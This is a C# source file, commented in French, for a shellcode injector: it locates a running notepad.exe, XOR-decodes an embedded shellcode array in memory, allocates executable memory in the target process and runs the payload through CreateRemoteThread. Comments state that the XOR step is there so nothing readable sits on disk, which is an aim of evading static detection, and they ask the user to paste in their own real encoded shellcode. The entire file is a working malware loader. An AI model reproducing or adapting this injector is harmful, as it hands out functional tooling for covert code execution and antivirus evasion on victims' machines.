using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodeInjector
{
    class Program
    {
        // ===== IMPORT DES API WINDOWS =====

        // Ouvre un processus existant (ici notepad.exe)
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        // Alloue de la mémoire DANS un autre processus
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        // Écrit des données (shellcode) dans la mémoire du processus cible
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] buffer,
            uint size,
            out IntPtr lpNumberOfBytesWritten
        );

        // Lance un thread dans le processus cible
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId
        );

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // ===== CONSTANTES =====

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint INFINITE = 0xFFFFFFFF;

        static void Main(string[] args)
        {
            try
            {
                // ===== 1️⃣ RÉCUPÉRATION DU PROCESSUS CIBLE =====

                Process[] processes = Process.GetProcessesByName("notepad");

                if (processes.Length == 0)
                {
                    Console.WriteLine("Notepad n'est pas lancé. Lance-le avant.");
                    return;
                }

                Process targetProcess = processes[0];
                Console.WriteLine($"Injection dans {targetProcess.ProcessName} (PID {targetProcess.Id})");

                // ===== 2️⃣ SHELLCODE OBFUSQUÉ (XOR) =====
                // IMPORTANT :
                // Le shellcode n'est PLUS en clair.
                // Chaque byte a été XORé avec une clé (0xAA ici).

                byte[] encodedShellcode = new byte[]
                {
                    0xE2, 0x9B, 0x63, 0xCF, 0xE2, 0x21, 0xEB, 0xCA,
                    0xE2, 0x21, 0xEA, 0xB2
                    // (exemple, garde TON shellcode réel XORé)
                };

                // Clé XOR (simple, volontairement faible)
                byte xorKey = 0xAA;

                // ===== 3️⃣ DÉOBFUSCATION EN MÉMOIRE =====
                // On reconstruit le shellcode original JUSTE AVANT l'injection
                // -> rien de lisible statiquement sur disque

                for (int i = 0; i < encodedShellcode.Length; i++)
                {
                    encodedShellcode[i] ^= xorKey;
                }

                byte[] shellcode = encodedShellcode;

                // ===== 4️⃣ OUVERTURE DU PROCESSUS =====

                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("OpenProcess a échoué.");
                    return;
                }

                // ===== 5️⃣ ALLOCATION MÉMOIRE DANS LE PROCESSUS CIBLE =====

                IntPtr allocMemAddress = VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                );

                if (allocMemAddress == IntPtr.Zero)
                {
                    Console.WriteLine("VirtualAllocEx a échoué.");
                    return;
                }

                // ===== 6️⃣ COPIE DU SHELLCODE =====

                bool result = WriteProcessMemory(
                    hProcess,
                    allocMemAddress,
                    shellcode,
                    (uint)shellcode.Length,
                    out _
                );

                if (!result)
                {
                    Console.WriteLine("WriteProcessMemory a échoué.");
                    return;
                }

                // ===== 7️⃣ EXÉCUTION VIA THREAD DISTANT =====

                IntPtr hThread = CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    0,
                    allocMemAddress,
                    IntPtr.Zero,
                    0,
                    out _
                );

                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("CreateRemoteThread a échoué.");
                    return;
                }

                WaitForSingleObject(hThread, INFINITE);
                Console.WriteLine("Injection terminée (shellcode XOR décodé en mémoire).");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erreur : {ex.Message}");
            }
        }
    }
}
